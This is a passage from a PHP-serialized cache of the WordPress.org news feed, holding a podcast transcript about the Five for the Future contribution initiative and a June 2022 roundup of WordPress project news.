Zielinski</a>, <a href=\"https://profiles.wordpress.org/addiestavlo/\">Addie</a>, <a href=\"https://profiles.wordpress.org/oztaser/\">Adil Öztaşer</a>, <a href=\"https://profiles.wordpress.org/andrewserong/\">Andrew Serong</a>, <a href=\"https://profiles.wordpress.org/annezazu/\">annezazu</a>, <a href=\"https://profiles.wordpress.org/bernhard-reiter/\">Bernie Reiter</a>, <a href=\"https://profiles.wordpress.org/cbravobernal/\">Carlos Bravo</a>, <a href=\"https://profiles.wordpress.org/poena/\">Carolina Nymark</a>, <a href=\"https://profiles.wordpress.org/critterverse/\">Channing Ritter</a>, <a href=\"https://profiles.wordpress.org/costdev/\">Colin Stewart</a>, <a href=\"https://profiles.wordpress.org/petitphp/\">Clement Boirie</a>, <a href=\"https://profiles.wordpress.org/danieliser/\">Daniel Iser</a>, <a href=\"https://profiles.wordpress.org/denishua/\">denishua</a>, <a href=\"https://profiles.wordpress.org/dd32/\">Dion Hulse</a>, <a href=\"https://profiles.wordpress.org/kebbet/\">Erik Betshammar</a>, <a href=\"https://profiles.wordpress.org/gabertronic/\">Gabriel Rose</a>, <a href=\"https://profiles.wordpress.org/mamaduka/\">George Mamadashvili</a>, <a href=\"https://profiles.wordpress.org/georgestephanis/\">George Stephanis</a>, <a href=\"https://profiles.wordpress.org/glendaviesnz/\">Glen Davies</a>, <a href=\"https://profiles.wordpress.org/grantmkin/\">Grant M. Kinney</a>, <a href=\"https://profiles.wordpress.org/gziolo/\">Greg Ziółkowski</a>, <a href=\"https://profiles.wordpress.org/ironprogrammer/\">ironprogrammer</a>, <a href=\"https://profiles.wordpress.org/jameskoster/\">James Koster</a>, <a href=\"https://profiles.wordpress.org/audrasjb/\">Jb Audras</a>, <a href=\"https://profiles.wordpress.org/jnz31/\">jnz31</a>, <a href=\"https://profiles.wordpress.org/desrosj/\">Jonathan Desrosiers</a>, <a href=\"https://profiles.wordpress.org/spacedmonkey/\">Jonny Harris</a>, <a href=\"https://profiles.wordpress.org/ryelle/\">Kelly Choyce-Dwan</a>, <a href=\"https://profiles.wordpress.org/knutsp/\">Knut Sparhell</a>, <a href=\"https://profiles.wordpress.org/luisherranz/\">Luis Herranz</a>, <a href=\"https://profiles.wordpress.org/onemaggie/\">Maggie Cabrera</a>, <a href=\"https://profiles.wordpress.org/manfcarlo/\">manfcarlo</a>, <a href=\"https://profiles.wordpress.org/manzurahammed/\">Manzur Ahammed</a>, <a href=\"https://profiles.wordpress.org/matveb/\">Matias Ventura</a>, <a href=\"https://profiles.wordpress.org/czapla/\">Michal Czaplinski</a>, <a href=\"https://profiles.wordpress.org/mcsf/\">Miguel Fonseca</a>, <a href=\"https://profiles.wordpress.org/mukesh27/\">Mukesh Panchal</a>, <a href=\"https://profiles.wordpress.org/navigatrum/\">navigatrum</a>, <a href=\"https://profiles.wordpress.org/ndiego/\">Nick Diego</a>, <a href=\"https://profiles.wordpress.org/ntsekouras/\">Nik Tsekouras</a>, <a href=\"https://profiles.wordpress.org/swissspidy/\">Pascal Birchler</a>, <a href=\"https://profiles.wordpress.org/peterwilsoncc/\">Peter Wilson</a>, <a href=\"https://profiles.wordpress.org/presskopp/\">Presskopp</a>, <a href=\"https://profiles.wordpress.org/ramonopoly/\">Ramon James Dodd</a>, <a href=\"https://profiles.wordpress.org/ravipatel/\">Ravikumar Patel</a>, <a href=\"https://profiles.wordpress.org/youknowriad/\">Riad Benguella</a>, <a href=\"https://profiles.wordpress.org/samikeijonen/\">Sami Keijonen</a>, <a href=\"https://profiles.wordpress.org/sergeybiryukov/\">Sergey Biryukov</a>, <a href=\"https://profiles.wordpress.org/timothyblynjacobs/\">Timothy Jacobs</a>, <a href=\"https://profiles.wordpress.org/tobifjellner/\">tobifjellner (Tor-Bjorn Fjellner)</a>, <a href=\"https://profiles.wordpress.org/nathannoom/\">Trinadin</a>, and <a href=\"https://profiles.wordpress.org/grapplerulrich/\">Ulrich Pogson</a>.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13138\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:22;a:6:{s:4:\"data\";s:61:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:7:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:64:\"WP Briefing: Episode 35: Five for the Future’s True Intentions\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:83:\"https://wordpress.org/news/2022/07/episode-35-five-for-the-futures-true-intentions/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Mon, 11 Jul 2022 12:00:00 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:7:\"Podcast\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:11:\"wp-briefing\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:53:\"https://wordpress.org/news/?post_type=podcast&p=13132\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:140:\"On this week\'s episode of the WordPress Briefing, Josepha answers questions about the intentions behind the Five for the Future initiative. \";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:9:\"enclosure\";a:1:{i:0;a:5:{s:4:\"data\";s:0:\"\";s:7:\"attribs\";a:1:{s:0:\"\";a:3:{s:3:\"url\";s:60:\"https://wordpress.org/news/files/2022/07/WP-Briefing-035.mp3\";s:6:\"length\";s:1:\"0\";s:4:\"type\";s:0:\"\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"Santana Inniss\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:14788:\"\n<p>In the thirty-fifth episode of the WordPress Briefing, Josepha Haden Chomphosy tackles questions about the true intentions of the Five for the Future initiative.</p>\n\n\n\n<p><em><strong>Have a question you&#8217;d like answered? You can submit them to You can submit them to <a href=\"mailto:wpbriefing@wordpress.org\">wpbriefing@wordpress.org</a>, either written or as a voice recording.</strong></em></p>\n\n\n\n<h2>Credits</h2>\n\n\n\n<p>Editor:&nbsp;<a href=\"https://profiles.wordpress.org/dustinhartzler/\">Dustin Hartzler</a><br>Logo:&nbsp;<a href=\"https://profiles.wordpress.org/beafialho/\">Beatriz Fialho</a><br>Production:&nbsp;<a href=\"https://profiles.wordpress.org/santanainniss/\">Santana Inniss</a><br>Song: Fearless First by Kevin MacLeod</p>\n\n\n\n<h2>References</h2>\n\n\n\n<ol><li><a href=\"https://make.wordpress.org/themes/2022/06/30/create-block-theme/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/themes/2022/06/30/create-block-theme/\">New Create Block Theme plugin</a></li><li><a href=\"https://make.wordpress.org/design/2022/07/01/open-sourcing-theme-designs/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/design/2022/07/01/open-sourcing-theme-designs/\">Open Sourcing Theme Designs </a></li><li><a href=\"https://make.wordpress.org/meta/2022/07/01/exploration-improving-devhub/\" data-type=\"URL\" data-id=\"https://make.wordpress.org/meta/2022/07/01/exploration-improving-devhub/\">Exploration in Meta to improve DevHub </a></li><li><a href=\"https://en.wikipedia.org/wiki/Tragedy_of_the_commons\" data-type=\"URL\" data-id=\"https://en.wikipedia.org/wiki/Tragedy_of_the_commons\">Tragedy of the Commons definition</a></li></ol>\n\n\n\n<h2>Transcript</h2>\n\n\n\n<span id=\"more-13132\"></span>\n\n\n\n<p>[Josepha Haden Chomphosy 00:00:10]&nbsp;&nbsp;</p>\n\n\n\n<p>Hello everyone. And welcome to the WordPress Briefing, the podcast where you can catch quick explanations of some of the ideas behind the WordPress open source project and the community around it, as well as get a small list of big things coming up in the next two weeks. I&#8217;m your host Josepha Haden Chomphosy. Here we go!</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:00:40]&nbsp;&nbsp;</p>\n\n\n\n<p>Today I&#8217;m talking about Five for the Future– again. Before we get stuck right into the heart of it, 10 episodes ago, in episode 25, I focused on the Five for the Future initiative and I recommend that you listen to that before you join me in today&#8217;s episode. It&#8217;s only eight minutes and it gives you a history of the Five for the Future initiative, as well as some information on the Five for the Future program.</p>\n\n\n\n<p>It then goes on to talk about some of the original intentions behind that original initiative. The reason I bring this back up today is partially because one, I will talk about both the program and the initiative it&#8217;s based on literally anytime. I believe strongly that they are both a vital part of what will result in a triumph of the commons of WordPress, and keep this empowering project around for years to come.&nbsp;</p>\n\n\n\n<p>But I also bring it up today because there&#8217;s conversation about a post I published a couple of months back that has generated some dialogue around the intentions of this catchy call to contribution. So to make sure that as we move through this discussion together, we are working with as much factual information as possible, I present to you some facts.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:01:46]&nbsp;&nbsp;</p>\n\n\n\n<p>First and foremost, the pillars of this initiative. The 5% in Five for the Future is aspirational. Contribution to open source is a question and indication of privilege. So the 5% is not a requirement, but rather it&#8217;s an aim. It could refer to 5% of your time or 5% of your resources, or just any amount of your time or resources around. Regardless of how you&#8217;re defining it, it is an aspiration, not a requirement.&nbsp;</p>\n\n\n\n<p>The second pillar, pledges show your intention and whatever contributions you are able to offer after you&#8217;ve made your pledge are always welcome. No one is out there checking for 100% completion of the hours that you intended to give back to WordPress versus the hours that you actually succeeded at giving back to WordPress.</p>\n\n\n\n<p>There are so many volunteers that make sure that this project is running and functional and has plenty of people knowing how to get things done and how to teach others how to get things done. It&#8217;s all coming from generosity of heart.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:02:52]&nbsp;&nbsp;</p>\n\n\n\n<p>And speaking of generosity, the third thing that is important about this initiative is that it insists on and wants to celebrate a culture of generosity. Beyond the concept of a pledge, is the idea of generous collaboration toward the long term health and stability of our project for the future.</p>\n\n\n\n<p>As contributors, we understand that we are greater than the sum of our parts and what we build <em>within</em> WordPress empowers those who build <em>with</em> WordPress. So those are the pillars that went into that initial thought, that opening Five for the Future call to action that Matt gave to everybody in 2014.</p>\n\n\n\n<p>And so now I want to share with you some of the pillars of the program that has grown up around it. So the Five for the Future initiative, if you&#8217;re not familiar, was started in 2014 and is a grand call to all of us to remember to give back to the shared commons of WordPress. Its aim was to help guard against what is called the “tragedy of the commons,” where resources are continually taken out and not necessarily reinvested in. No one&#8217;s necessarily putting anything back into those.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:04:06]&nbsp;&nbsp;</p>\n\n\n\n<p>So that&#8217;s the starting point for all of this. So the program, the Five for the Future program, in 2018 was built as a collaborative effort with full participation and buy-in from the contributors who were active in the project at the time. It allowed anyone to raise their hands, to show support of WordPress via a pledge and also started a multi-year discussion of how to define contributions in a way that let us automatically provide props and therefore more effectively put badges on people&#8217;s wordpress.org profiles.&nbsp;</p>\n\n\n\n<p>And then in 2019, there was an additional pilot of the program, which kind of offered some team structure, which was intended to not only take on work that I don&#8217;t like to ask volunteers to do, but also to provide some checks and balances to an absolute raft of sponsored contributor hours that we had started to see show up.&nbsp;</p>\n\n\n\n<p>Which brings us then to the post that I mentioned at the start. Knowledgeable supporters of the WordPress open source project have debated next iterations to Five for the Future activity and programming. So, to bring the conversation to a central set of questions, or rather to bring the conversation to a central spot, I raised these two questions. One, what activities can we see inside our contributor networks? So wordpress.org, make.wordpress.org, the Rosetta sites that we have, Slack, et cetera.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:05:30]&nbsp;&nbsp;</p>\n\n\n\n<p>So what activities can we see inside the contributor networks that we can flag to enable easier distribution of props and therefore badges? The second question is, what activities can we see also in those contributor networks that appear to be contributions, but in the end are only benefiting the person or company that provides the contributions?</p>\n\n\n\n<p>For what it&#8217;s worth that discussion then also raised a third question that I don&#8217;t think we&#8217;ve even started to tackle, which is what about the activities that are not in the contributor network, but still do move WordPress forward? Cause there are so, so many of those things and it&#8217;s a great question. I don&#8217;t have an answer and just so that I don&#8217;t leave you all with a series of questions for which there are no answers provided in this particular podcast, I do have a few answers for questions that I have seen floating around this discussion.&nbsp;</p>\n\n\n\n<p>So the first question is actually a bunch of questions. There are like three parts to it. What are props, who gives props, and who tracks them? So ‘props’ is a term used in WordPress to describe shared recognition of a contribution. Think of it as like a hat tip or kudos or an assist. However you think about it, it&#8217;s recognition of the other people who helped to solve a problem along the way. That is what props are.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:06:47]&nbsp;&nbsp;</p>\n\n\n\n<p>The second part of that question is who gives props and historically developers have given props, which tends to mean that it&#8217;s mostly developers who get props. But now, also, any team rep during a release cycle can provide props to folks on their team, volunteers on their team who were really helpful during the course of the release.</p>\n\n\n\n<p>And recently we also added the functionality for ad hoc props to be given in the Slack props channel, and those get added to your profile activity. So that someone can give you basically a public thanks for having helped on something that they were working on. And then that gets logged in your activity tracker on your WordPress.org profile.</p>\n\n\n\n<p>And then the final question in that first big question is who tracks these props? And the answer is human beings! Which is why folks feel like they have to do a ton of things before they even get props. And that&#8217;s also why I&#8217;d like to automate more and more of them so that you don&#8217;t have to do a ton of things in order for someone to show up and acknowledge that you are part of a solution.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:07:51]&nbsp;&nbsp;</p>\n\n\n\n<p>So the second question that I&#8217;ve seen kind of running around is, where do props start? And that is a great question that has been asked year after year. And one that I think we should continue to ask. The reality is that we won&#8217;t be able to see every contribution to WordPress, but that doesn&#8217;t mean that they aren&#8217;t valuable. And it doesn&#8217;t mean that they don&#8217;t matter.&nbsp;</p>\n\n\n\n<p>Building our culture of generosity helps us to better recognize and celebrate each other for all of our contributions, whether they are for a major release or a major event, or one of these new ad hoc props that you can offer to people. And if we see more and more of the same type of contributions being celebrated, then we can also work toward automating those as well, so that you don&#8217;t have to do a super ton of them before someone has noticed that you&#8217;ve done even one of them.&nbsp;</p>\n\n\n\n<p>And the third big question that has been running around is, what about the people who don&#8217;t want the props? If people want to be literally anonymous, then deletion requests are probably your way to go. But I actually don&#8217;t think that&#8217;s the question here. I think the question is what if a prop holds no intrinsic value to you and then, you know, I wanna thank you for that spirit of generosity. And I also wanna say that I&#8217;m so glad you&#8217;re here.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:09:02]&nbsp;&nbsp;&nbsp;</p>\n\n\n\n<p>Hopefully, all of these answers clarify what lies at the heart of what is intended with the Five for the Future initiative and the program that&#8217;s built on top of it. And why I care so much about fixing the ways we offer props to folks. For me, it&#8217;s not about assessing the worthiness of people or companies or any of their contributions. For me, it&#8217;s about reinvesting in the shared commons of the WordPress ecosystem, by finding a way that our economy can entice folks to put back into WordPress, something close to the benefit that they receive from it.</p>\n\n\n\n<p>And that brings us now to our small list of big things. Thank you all for making it into the final stretches with me. These three things that I&#8217;m sharing also have companion blog posts to go with them because they are very big questions or very big features, very big plugin kind of things that we&#8217;re looking at. And so you&#8217;ll be able to find those in the show notes, or you can go to wordpress.org/news if you&#8217;re listening to this in a podcast player of your choice that is not wordpress.org.&nbsp;</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:10:10]&nbsp;&nbsp;&nbsp;</p>\n\n\n\n<p>So the first one on my list is a new plugin. It is called Create Block Theme. And it&#8217;s gonna make it easier for theme builders to use the existing site editor tools to create new block themes. I&#8217;m very excited about this. Uh, you can find it on make.wordpress.org/themes. And I will also include a link to it in the show notes below.&nbsp;</p>\n\n\n\n<p>If themes are not your area of expertise, but you are interested in documentation or the DevHub or to an extent design things, then the improvements that are being worked on for the DevHub are definitely in your area. That&#8217;s kind of a Meta task, but has a few other pieces involved as well. That can be found on make.wordpress.org/meta. But again, I will have a link to the very, very detailed blog post in the show notes.&nbsp;</p>\n\n\n\n<p>It&#8217;s got a bunch of hypothetical changes that are being suggested for the WordPress developer docs, uh, especially when it comes to the function reference. And so there are gonna be some slight design questions, but not like, graphic design/visual design, more in the like, can humans read this design area of things? And so that will be a good one to look at. If you are sort of in the Meta or Documentation vein of things in the way that you like to contribute to WordPress.</p>\n\n\n\n<p>[Josepha Haden Chomphosy 00:011:30]&nbsp;&nbsp;&nbsp;</p>\n\n\n\n<p>And then the final thing is about open sourcing theme designs. So open sourcing everything obviously is important to us. And the design tool that we use, this tool called Figma, is open to the public. And so it&#8217;s possible for folks to be able to kind of get in there and use and reuse any design elements.</p>\n\n\n\n<p>And so there&#8217;s a discussion happening over on make.wordpress.org/design about how that can and should look in the future. And so if design is definitely your area, and again, this kind of lines up with themes a little bit, then wander over into that one, for which there will also be a link in the show notes.&nbsp;</p>\n\n\n\n<p>And that my friends is your small list of big things. Thank you for tuning in today for the WordPress Briefing. I&#8217;m your host, Josepha Haden Chomphosy. And I&#8217;ll see you again in a couple of weeks.</p>\n\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:30:\"com-wordpress:feed-additions:1\";a:1:{s:7:\"post-id\";a:1:{i:0;a:5:{s:4:\"data\";s:5:\"13132\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}}}i:23;a:6:{s:4:\"data\";s:60:\"\n		\n		\n		\n		\n		\n				\n		\n		\n\n					\n										\n					\n		\n		\n			\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";s:5:\"child\";a:4:{s:0:\"\";a:6:{s:5:\"title\";a:1:{i:0;a:5:{s:4:\"data\";s:36:\"The Month in WordPress – June 2022\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"link\";a:1:{i:0;a:5:{s:4:\"data\";s:68:\"https://wordpress.org/news/2022/07/the-month-in-wordpress-june-2022/\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:7:\"pubDate\";a:1:{i:0;a:5:{s:4:\"data\";s:31:\"Wed, 06 Jul 2022 14:19:50 +0000\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:8:\"category\";a:2:{i:0;a:5:{s:4:\"data\";s:18:\"Month in WordPress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}i:1;a:5:{s:4:\"data\";s:18:\"month in wordpress\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:4:\"guid\";a:1:{i:0;a:5:{s:4:\"data\";s:35:\"https://wordpress.org/news/?p=13069\";s:7:\"attribs\";a:1:{s:0:\"\";a:1:{s:11:\"isPermaLink\";s:5:\"false\";}}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}s:11:\"description\";a:1:{i:0;a:5:{s:4:\"data\";s:313:\"With WordPress 6.1 already in the works, a lot of updates happened during June. Here&#8217;s a summary to catch up on the ones you may have missed.&#160; WordPress 6.1 is Slated for Release on October 25, 2022 Planning for WordPress 6.1 kicked off a few weeks ago with a proposed schedule and a call for [&#8230;]\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:32:\"http://purl.org/dc/elements/1.1/\";a:1:{s:7:\"creator\";a:1:{i:0;a:5:{s:4:\"data\";s:14:\"rmartinezduque\";s:7:\"attribs\";a:0:{}s:8:\"xml_base\";s:0:\"\";s:17:\"xml_base_explicit\";b:0;s:8:\"xml_lang\";s:0:\"\";}}}s:40:\"http://purl.org/rss/1.0/modules/content/\";a:1:{s:7:\"encoded\";a:1:{i:0;a:5:{s:4:\"data\";s:12416:\"\n<p>With WordPress 6.1 already in the works, a lot of updates happened during June. Here&#8217;s a summary to catch up on the ones you may have missed.&nbsp;</p>\n\n\n\n<hr class=\"wp-block-separator has-css-opacity\" />\n\n\n\n<h2>WordPress 6.1 is Slated for Release on October 25, 2022</h2>\n\n\n\n<p>Planning for WordPress 6.1 kicked off a few weeks ago with a <a href=\"https://make.wordpress.org/core/2022/06/23/wordpress-6-1-planning-roundup/\"><strong>proposed schedule and a call for contributors</strong></a> to the release team. This will be the third major release in 2022 and will include up to Gutenberg 14.1 for a total of 11 Gutenberg releases.</p>\n\n\n\n<p><a href=\"https://profiles.wordpress.org/matveb/\">Matías Ventura</a> published the preliminary <a href=\"https://make.wordpress.org/core/2022/06/04/roadmap-to-6-1/\">roadmap for version 6.1</a>, which is expected to refine the full site editing experience introduced in the last two major releases. Stay tuned for a companion post with more details on what’s to come.</p>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\"><p>Tune in to the <a href=\"https://wordpress.org/news/2022/06/episode-34-wordpress-6-1-is-coming/\">latest episode of WP Briefing</a> to hear WordPress Executive Director Josepha Haden discuss planning for major releases and how you can get involved.</p></blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>New in Gutenberg: Versions 13.4 and 13.5</h2>\n\n\n\n<p>There are two new versions of Gutenberg since last month’s edition of the Month in WordPress:</p>\n\n\n\n<ul><li><a href=\"https://make.wordpress.org/core/2022/06/10/whats-new-in-gutenberg-13-4-8-june/\"><strong>Gutenberg 13.4</strong></a> includes 25 enhancements and nearly 30 bug fixes. This version adds support for button elements in theme.json and introduces axial spacing in Gallery Block, among other new features.</li><li><a href=\"https://make.wordpress.org/core/2022/06/22/whats-new-in-gutenberg-13-5-22-june/\"><strong>Gutenberg 13.5</strong></a> was released on June 22, 2022. It comes with an improved featured image UX, expanded design tools for the Post Navigation Link block, and solid accessibility fixes.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\"><p>Follow the “<a href=\"https://make.wordpress.org/core/tag/gutenberg-new/\">What’s new in Gutenberg</a>” posts to stay up to date with the latest updates.</p></blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Team Updates: Gutenberg Page Redesign, Meetup Venue Support Funds, and More</h2>\n\n\n\n<ul><li><a href=\"https://wordpress.org/gutenberg/\">The Gutenberg page</a> got a new redesign! You can<strong> </strong>rearrange the page content the way you want and experience the flexibility that blocks allow. Learn more about the inspiration behind the new look in <a href=\"https://make.wordpress.org/design/2021/10/29/redesign-of-the-gutenberg-page/\">this post</a>.</li><li>WordPress Community Support (WPCS) restarted its <a href=\"https://make.wordpress.org/community/2022/06/22/announcement-reactivating-meetup-venue-support-funds/\">meetup venue support funds</a> for community organizers.</li><li>The Themes Team ​​released a <a href=\"https://make.wordpress.org/themes/2022/06/30/create-block-theme/\">new plugin called Create Block Theme</a> that makes it easier for theme builders to create block themes.</li><li>Matías Ventura, the lead architect of the Gutenberg project, shared some early thoughts on <a href=\"https://make.wordpress.org/design/2022/06/13/thinking-through-the-wordpress-admin-experience/\">the future of the WordPress admin interface</a>.</li><li>Each month, the Training Team publishes a list of new resources available on the Learn WordPress platform. <a href=\"https://make.wordpress.org/updates/2022/06/07/whats-new-on-learnwp-in-may-2022/\">Check out what’s new</a>.</li><li>The Polyglots Team kicked off conversations for planning the <a href=\"https://make.wordpress.org/polyglots/2022/06/15/wp-translation-day-in-september-2022-suggestion-discussion/\">next WordPress Translation Day</a>.</li><li>The Documentation Team posted a series of <a href=\"https://make.wordpress.org/docs/2022/06/13/live-onboarding-sessions-for-the-documentation-team/\">onboarding sessions</a> to get started with documentation.</li><li>After reviewing feedback raised by the community, the Performance Team proposed <a href=\"https://make.wordpress.org/core/2022/06/30/plan-for-adding-webp-multiple-mime-support-for-images/\">a new approach to add WebP and MIME support</a> for images.</li><li>The Themes Team updated its <a href=\"https://make.wordpress.org/themes/2022/06/18/complying-with-gdpr-when-using-google-fonts/\">recommendations for hosting webfonts</a> to follow Europe’s General Data Protection Regulation (GDPR).</li><li>In a step towards <a href=\"https://make.wordpress.org/design/2022/07/01/open-sourcing-theme-designs/\">open sourcing theme designs</a>, the Design Team made some themes authored by WordPress core and other theme developers available in a Figma file.</li><li>The Marketing Team started a discussion to gather feedback on <a href=\"https://make.wordpress.org/marketing/2022/06/17/discussion-promoting-wordcamps-with-the-official-wordpress-social-accounts/\">promoting WordCamps</a> with the official WordPress.org social accounts.</li><li>The Openverse Team <a href=\"https://make.wordpress.org/openverse/2022/06/17/mitigating-out-of-terms-api-usage/\">released version 2.5.5 of the Openverse API</a>, which brings an important change regarding anonymous API requests.</li><li>The Plugin Review Team shared a comprehensive <a href=\"https://make.wordpress.org/plugins/2022/06/15/whats-the-deal-with-invalid-reviews/\">post on invalid plugin reviews</a>.</li><li>The June edition of the <a href=\"https://make.wordpress.org/community/2022/06/24/monthly-organizer-newsletter-june-2022/\">Meetup Organizer Newsletter</a> is now live with a list of ideas on reactivating meetups.</li><li>Check out the <a href=\"https://make.wordpress.org/polyglots/2022/06/27/polyglots-monthly-newsletter-june-2022/\">Polyglots Monthly Newsletter: June 2022</a> to stay up to date with the latest updates from the Polyglots community.</li><li>The latest edition of People of WordPress features the story of web developer <a href=\"https://wordpress.org/news/2022/06/people-of-wordpress-leo-gopal/\">Leo Gopal</a>.</li><li><a href=\"https://block-museum.com/\">The Museum of Block Art</a> (MOBA), a virtual initiative that showcases creative uses of the WordPress block editor, is <a href=\"https://gutenbergtimes.com/museum-of-block-art-is-open-for-submissions/\">now open for submissions</a>.</li><li>Last month the WordPress community was saddened to hear of the passing of <a href=\"https://profiles.wordpress.org/wolly/\">Wolly</a> (Paolo Valenti). Wolly was a long-time WordPress contributor and one of the founding members of the vibrant Italian community. He will be missed.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\"><p>The BlackPress community is a great place to connect with black African descent people in the WordPress space, access tech resources, and advance your career skills. <a href=\"https://blackpresswp.com\">Join the BlackPress Community</a>.</p></blockquote>\n\n\n\n<div style=\"height:10px\" aria-hidden=\"true\" class=\"wp-block-spacer\"></div>\n\n\n\n<h2>Feedback/Testing Requests</h2>\n\n\n\n<ul><li>The Core Team is looking for <a href=\"https://make.wordpress.org/core/2022/06/26/rollback-feature-testing-call-to-action/\">help in testing a rollback functionality</a> for failed plugin and theme updates.</li><li>There’s an open call for feedback on a proposal to make building features and plugins on top of the WordPress REST API easier. <a href=\"https://make.wordpress.org/core/2022/07/04/proposal-better-rest-api-handling-in-javascript/\">Share your thoughts</a> by July 18, 2022.</li><li>The Training Team suggested a public content roadmap for <a href=\"https://make.wordpress.org/training/2022/06/29/learn-wordpress-development-creating-a-public-roadmap-for-content-creation/\">Learn WordPress development</a>. Comments are welcome until July 15, 2022.</li><li>Version 20.2 of WordPress for <a href=\"https://make.wordpress.org/mobile/2022/06/28/call-for-testing-wordpress-for-android-20-2/\">Android</a> and <a href=\"https://make.wordpress.org/mobile/2022/06/29/call-for-testing-wordpress-for-ios-20-2/\">iOS</a> is now available for testing.</li><li>Some members of the Meta Team did some experiments with <a href=\"https://make.wordpress.org/meta/2022/07/01/exploration-improving-devhub/\">hypothetical changes to the WordPress Developer Docs</a>. They welcome feedback on the next steps.</li></ul>\n\n\n\n<blockquote class=\"wp-block-quote has-extra-large-font-size\"><p>Want to get involved in testing WordPress?<strong> </strong>Follow the &#8220;<a href=\"https://make.wordpress.org/test/tag/build-test-tools/\">Week in Test</a>&#8221; posts to find a handy list of links and 